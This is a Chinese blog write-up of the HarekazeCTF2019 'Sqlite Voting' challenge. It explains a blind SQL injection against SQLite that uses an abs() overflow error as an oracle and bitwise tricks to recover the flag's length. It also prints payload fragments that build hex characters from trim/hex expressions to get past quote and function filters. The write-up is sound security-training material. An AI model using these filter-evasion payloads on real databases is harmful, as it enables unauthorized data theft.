---
title: '[HarekazeCTF2019]Sqlite Voting'
author: Troy3e
avatar: 'https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/41414542.jpg'
authorAbout: steamID：888007034
authorDesc: Blizzard：TroyeSivan#51769
categories: 技术
comments: true
date: 2021-01-26 15:38:11
authorLink:
tags:
keywords:
description:
photos: https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/1126609.png
---

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210127211526.png)

由schema.sql可知flag在flag表里，update有不同的回显，猜测可以盲注。虽然引号和char都被ban了，但还能用hex。

先考虑对 flag 16 进制长度的判断，假设它的长度为 x，y 表示 2 的 n 次方，那么 x&y 就能表现出 x 二进制为 1 的位置，将这些 y 再进行或运算就可以得到完整的 x 的二进制，也就得到了 flag 的长度，而 1<<n 恰可以表示 2 的 n 次方

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210127222415.png)

如何构造报错就不知道了，看了wp知道是sqlite3的一个特性：在 sqlite3 中，abs 函数有一个整数溢出的报错，如果 abs 的参数是 -9223372036854775808 就会报错，同样如果是正数也会报错。

判断flag长度：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210127234041.png)

接下来一个个进行判断，但是 is_valid() 过滤了大部分截取字符的函数，而且也无法用 ASCII 码判断。

不会，参考wp。

这一题对盲注语句的构造很巧妙，首先利用如下语句分别构造出 ABCDEF ，这样十六进制的所有字符都可以使用了，并且使用 trim(0,0) 来表示空字符。

    # hex(b'zebra') = 7A65627261
      # 除去 12567 就是 A ，其余同理
      A = 'trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)'

      C = 'trim(hex(typeof(.1)),12567)'

      D = 'trim(hex(0xffffffffffffffff),123)'

      E = 'trim(hex(0.1),1230)'

      F = 'trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)'

      # hex(b'koala') = 6B6F616C61
      # 除去 16CF 就是 B
      B = f'trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||{C}||{F})'

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210128003015.png)
懒得写脚本，嫖了一个

HarekazeCTF2019 Web全部WP参考：https://xz.aliyun.com/t/6628